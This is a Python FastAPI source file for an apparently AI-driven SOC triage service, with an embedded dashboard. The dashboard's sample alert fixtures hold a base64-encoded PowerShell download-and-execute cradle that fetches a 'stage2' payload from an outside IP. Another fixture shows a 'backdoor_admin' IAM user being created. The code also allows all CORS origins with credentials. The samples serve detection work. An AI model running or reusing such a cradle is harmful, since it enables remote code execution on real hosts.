"""
FastAPI Application for Autonomous Tier-1 AI SOC Analyst.
Provides RESTful alert webhook endpoints, CTI lookup, graph visualization,
and an embedded real-time SOC Analyst Web Dashboard.
"""

from datetime import datetime, timezone
import json
import os
from typing import Dict, List, Optional
from fastapi import FastAPI, HTTPException, status
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, PlainTextResponse

from analyst_core.correlation.attack_graph import AttackGraphBuilder
from analyst_core.enrichment.cti_client import CTIClient
from analyst_core.orchestrator import AnalystOrchestrator
from analyst_core.reporting.incident_report import IncidentReportGenerator
from analyst_core.state import InvestigationState, Observable, ObservableType
from .schemas import (
    AlertIngestRequest,
    EnrichRequest,
    EnrichResponse,
    HealthResponse,
    InvestigationDetailResponse,
    TriageSummaryResponse,
)

app = FastAPI(
    title="Autonomous Tier-1 AI SOC Analyst API",
    description="Production-grade autonomous security operations pipeline for alert triage, graph correlation, and incident response.",
    version="1.0.0",
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# In-memory investigation storage
INVESTIGATIONS: Dict[str, InvestigationState] = {}
DEFAULT_PROVIDER = os.getenv("DEFAULT_REASONING_PROVIDER", "mock")


@app.get("/health", response_model=HealthResponse, tags=["System"])
def healthcheck():
    """Returns the operational status of the autonomous analyst service."""
    return HealthResponse(
        status="HEALTHY",
        version="1.0.0",
        engine="Autonomous Tier-1 AI SOC Analyst",
        active_provider=DEFAULT_PROVIDER,
    )


@app.post("/api/v1/triage", response_model=TriageSummaryResponse, status_code=status.HTTP_201_CREATED, tags=["Triage"])
def triage_alert(payload: AlertIngestRequest):
    """Ingests raw alert telemetry, correlates attack graph, executes LLM triage, and stores findings."""
    provider = payload.reasoning_provider or DEFAULT_PROVIDER
    orchestrator = AnalystOrchestrator(reasoning_provider=provider)

    try:
        state = orchestrator.investigate(
            raw_telemetry=payload.telemetry,
            investigation_id=payload.investigation_id,
        )
        INVESTIGATIONS[state.investigation_id] = state

        return TriageSummaryResponse(
            investigation_id=state.investigation_id,
            status="COMPLETED",
            verdict=state.verdict,
            confidence_score=state.confidence_score,
            severity=state.severity,
            correlated_events=len(state.alerts),
            mitre_techniques_count=len(state.mitre_techniques),
            containment_actions_count=len(state.containment_playbook),
            executive_summary=state.executive_summary,
            created_at=state.created_at,
        )
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Triage execution failed: {str(e)}",
        )


@app.get("/api/v1/investigations/{investigation_id}", response_model=InvestigationDetailResponse, tags=["Triage"])
def get_investigation(investigation_id: str):
    """Retrieves full investigation state, hypotheses, MITRE mappings, and containment steps."""
    state = INVESTIGATIONS.get(investigation_id)
    if not state:
        raise HTTPException(status_code=404, detail="Investigation record not found.")

    report_md = IncidentReportGenerator.generate_markdown(state)

    return InvestigationDetailResponse(
        investigation_id=state.investigation_id,
        verdict=state.verdict,
        confidence_score=state.confidence_score,
        severity=state.severity,
        executive_summary=state.executive_summary,
        root_cause_analysis=state.root_cause_analysis,
        correlated_alerts_count=len(state.alerts),
        mitre_techniques=state.mitre_techniques,
        hypotheses=state.hypotheses,
        containment_playbook=state.containment_playbook,
        report_markdown=report_md,
        created_at=state.created_at,
    )


@app.get("/api/v1/investigations/{investigation_id}/report", response_class=PlainTextResponse, tags=["Reporting"])
def get_report_markdown(investigation_id: str):
    """Returns the formatted GitHub-flavored Markdown incident report."""
    state = INVESTIGATIONS.get(investigation_id)
    if not state:
        raise HTTPException(status_code=404, detail="Investigation record not found.")
    return IncidentReportGenerator.generate_markdown(state)


@app.get("/api/v1/investigations/{investigation_id}/playbook", tags=["Reporting"])
def get_soar_playbook(investigation_id: str):
    """Returns structured JSON containment playbook for SOAR integration."""
    state = INVESTIGATIONS.get(investigation_id)
    if not state:
        raise HTTPException(status_code=404, detail="Investigation record not found.")
    return IncidentReportGenerator.generate_json_playbook(state)


@app.get("/api/v1/investigations/{investigation_id}/graph", tags=["Correlation"])
def get_attack_graph(investigation_id: str):
    """Returns the NetworkX attack graph exported in Cytoscape JSON format for UI rendering."""
    state = INVESTIGATIONS.get(investigation_id)
    if not state:
        raise HTTPException(status_code=404, detail="Investigation record not found.")

    builder = AttackGraphBuilder()
    builder.build_from_alerts(state.alerts)
    return builder.to_cytoscape_json()


@app.post("/api/v1/enrich", response_model=EnrichResponse, tags=["Enrichment"])
def enrich_indicator(req: EnrichRequest):
    """Ad-hoc indicator lookup against local CTI caching and threat intelligence sources."""
    client = CTIClient()
    try:
        obs_type = ObservableType(req.ioc_type.lower()) if req.ioc_type else ObservableType.IP
    except ValueError:
        obs_type = ObservableType.IP

    obs = Observable(obs_type=obs_type, value=req.indicator)
    indicator = client.query_indicator(obs)

    return EnrichResponse(
        indicator=indicator.indicator,
        ioc_type=indicator.ioc_type.value,
        malicious=indicator.malicious,
        threat_score=indicator.threat_score,
        tags=indicator.tags,
        description=indicator.description,
    )


@app.get("/", response_class=HTMLResponse, tags=["Dashboard"])
def get_dashboard():
    """Serves an interactive Web Dashboard for the Autonomous AI SOC Analyst."""
    return """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Autonomous Tier-1 AI SOC Analyst | Command Center</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg-base: #090d16;
      --bg-surface: #101726;
      --bg-card: rgba(19, 29, 49, 0.7);
      --border: rgba(255, 255, 255, 0.08);
      --border-accent: rgba(56, 189, 248, 0.25);
      --primary: #38bdf8;
      --primary-glow: rgba(56, 189, 248, 0.2);
      --danger: #ef4444;
      --danger-glow: rgba(239, 68, 68, 0.25);
      --success: #10b981;
      --warning: #f59e0b;
      --text-main: #f8fafc;
      --text-muted: #94a3b8;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background-color: var(--bg-base);
      color: var(--text-main);
      font-family: 'Plus Jakarta Sans', sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }
    header {
      background: rgba(16, 23, 38, 0.85);
      backdrop-filter: blur(16px);
      border-bottom: 1px solid var(--border);
      padding: 16px 32px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      position: sticky;
      top: 0;
      z-index: 100;
    }
    .brand {
      display: flex;
      align-items: center;
      gap: 12px;
      font-weight: 800;
      font-size: 1.15rem;
      letter-spacing: -0.5px;
    }
    .shield-badge {
      background: linear-gradient(135deg, #0284c7, #38bdf8);
      padding: 6px 12px;
      border-radius: 8px;
      font-size: 0.8rem;
      font-weight: 700;
      color: #000;
      box-shadow: 0 0 15px var(--primary-glow);
    }
    .main-grid {
      display: grid;
      grid-template-columns: 420px 1fr;
      gap: 24px;
      padding: 24px 32px;
      flex: 1;
    }
    .panel {
      background: var(--bg-card);
      border: 1px solid var(--border);
      border-radius: 14px;
      padding: 20px;
      backdrop-filter: blur(12px);
      display: flex;
      flex-direction: column;
      gap: 16px;
    }
    .panel-title {
      font-size: 0.95rem;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.8px;
      color: var(--text-muted);
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    textarea {
      width: 100%;
      height: 280px;
      background: #080c14;
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 14px;
      color: #38bdf8;
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.82rem;
      resize: vertical;
      outline: none;
    }
    textarea:focus { border-color: var(--primary); }
    .btn-row { display: flex; gap: 10px; }
    button {
      flex: 1;
      padding: 12px 18px;
      border-radius: 8px;
      border: none;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s ease;
      font-size: 0.88rem;
    }
    .btn-primary {
      background: #0284c7;
      color: white;
      box-shadow: 0 4px 14px rgba(2, 132, 199, 0.4);
    }
    .btn-primary:hover { background: #0369a1; transform: translateY(-1px); }
    .btn-outline {
      background: transparent;
      border: 1px solid var(--border);
      color: var(--text-muted);
    }
    .btn-outline:hover { background: rgba(255,255,255,0.05); color: white; }
    .stats-row {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 12px;
    }
    .stat-card {
      background: #0d1424;
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 14px;
      text-align: center;
    }
    .stat-label { font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; }
    .stat-val { font-size: 1.35rem; font-weight: 800; margin-top: 4px; font-family: 'JetBrains Mono', monospace; }
    .report-view {
      background: #080c14;
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 18px;
      flex: 1;
      overflow-y: auto;
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.83rem;
      white-space: pre-wrap;
      color: #cbd5e1;
      line-height: 1.5;
    }
    .status-badge {
      display: inline-block;
      padding: 4px 10px;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 700;
    }
    .badge-tp { background: var(--danger-glow); color: var(--danger); border: 1px solid var(--danger); }
    .badge-fp { background: rgba(16, 185, 129, 0.2); color: var(--success); border: 1px solid var(--success); }
  </style>
</head>
<body>
  <header>
    <div class="brand">
      <span class="shield-badge">TIER-1 AI SOC</span>
      <span>Autonomous Threat Investigation Agent</span>
    </div>
    <div style="font-size: 0.85rem; color: var(--text-muted);">
      Engine Status: <strong style="color: var(--success);">ONLINE ($0 Local Ollama/Mock)</strong>
    </div>
  </header>

  <div class="main-grid">
    <div class="panel">
      <div class="panel-title">
        <span>Raw Alert Telemetry Ingestion</span>
        <span style="font-size: 0.75rem; color: var(--primary);">Sysmon / CloudTrail / Zeek</span>
      </div>
      <textarea id="telemetryInput" placeholder="Paste alert JSON telemetry here...">{
  "EventID": 1,
  "Computer": "FIN-WS-04",
  "User": "CORP\\\\finance_user",
  "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
  "CommandLine": "powershell.exe -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vNDUuMzMuMzIuMTU2L3N0YWdlMl9wYXlsb2FkLnBzMScp",
  "ParentImage": "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE",
  "DestinationIp": "45.33.32.156",
  "DestinationPort": 443
}</textarea>
      <div class="btn-row">
        <button class="btn-primary" onclick="runTriage()">Execute Triage</button>
        <button class="btn-outline" onclick="loadFixture('ransomware')">Ransomware</button>
        <button class="btn-outline" onclick="loadFixture('admin')">Admin FP</button>
        <button class="btn-outline" onclick="loadFixture('cloud')">Cloud Abuse</button>
      </div>
      <div style="font-size: 0.78rem; color: var(--text-muted); line-height: 1.4;">
        💡 Autonomous pipeline executes observable parsing, CTI reputation checks, NetworkX attack graph modeling, and Chain-of-Thought LLM triage.
      </div>
    </div>

    <div class="panel">
      <div class="panel-title">
        <span>Investigation Findings & Triage Receipt</span>
        <span id="verdictBadge" class="status-badge" style="display:none;"></span>
      </div>

      <div class="stats-row">
        <div class="stat-card">
          <div class="stat-label">Verdict</div>
          <div class="stat-val" id="statVerdict">--</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Confidence</div>
          <div class="stat-val" id="statConfidence" style="color: var(--primary);">--</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Severity</div>
          <div class="stat-val" id="statSeverity">--</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Actions</div>
          <div class="stat-val" id="statActions" style="color: var(--warning);">--</div>
        </div>
      </div>

      <div class="report-view" id="reportView">Click 'Execute Triage' to begin autonomous investigation of the alert payload...</div>
    </div>
  </div>

  <script>
    async function runTriage() {
      const input = document.getElementById('telemetryInput').value;
      const reportView = document.getElementById('reportView');
      reportView.innerText = "[*] Running autonomous triage pipeline...\\n[*] Ingesting telemetry...\\n[*] Enriching indicators against threat intel...\\n[*] Constructing NetworkX attack chain...\\n[*] Executing Chain-of-Thought reasoning...";

      try {
        const payload = JSON.parse(input);
        const res = await fetch('/api/v1/triage', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ telemetry: payload, reasoning_provider: 'mock' })
        });
        const summary = await res.json();

        // Update stats
        document.getElementById('statVerdict').innerText = summary.verdict;
        document.getElementById('statConfidence').innerText = summary.confidence_score + '%';
        document.getElementById('statSeverity').innerText = summary.severity;
        document.getElementById('statActions').innerText = summary.containment_actions_count;

        // Fetch Markdown report
        const repRes = await fetch('/api/v1/investigations/' + summary.investigation_id + '/report');
        const mdText = await repRes.text();
        reportView.innerText = mdText;
      } catch (err) {
        reportView.innerText = "[!] Error: " + err.message;
      }
    }

    function loadFixture(type) {
      if (type === 'ransomware') {
        document.getElementById('telemetryInput').value = JSON.stringify({
          "EventID": 1,
          "Computer": "FIN-WS-04",
          "User": "CORP\\\\finance_user",
          "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
          "CommandLine": "powershell.exe -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vNDUuMzMuMzIuMTU2L3N0YWdlMl9wYXlsb2FkLnBzMScp",
          "ParentImage": "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE",
          "DestinationIp": "45.33.32.156",
          "DestinationPort": 443
        }, null, 2);
      } else if (type === 'admin') {
        document.getElementById('telemetryInput').value = JSON.stringify({
          "EventID": 1,
          "Computer": "SRV-BACKUP-01",
          "User": "CORP\\\\svc-backup",
          "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
          "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\\\AdminScripts\\\\Weekly_Disk_Defrag_Backup.ps1",
          "ParentImage": "C:\\\\Windows\\\\System32\\\\taskhostw.exe"
        }, null, 2);
      } else if (type === 'cloud') {
        document.getElementById('telemetryInput').value = JSON.stringify({
          "eventSource": "iam.amazonaws.com",
          "eventName": "CreateUser",
          "sourceIPAddress": "185.220.101.5",
          "userIdentity": {
            "type": "IAMUser",
            "userName": "devops-ci",
            "accessKeyId": "AKIAIOSFODNN7EXAMPLE"
          },
          "requestParameters": {
            "userName": "backdoor_admin"
          }
        }, null, 2);
      }
    }
  </script>
</body>
</html>
"""
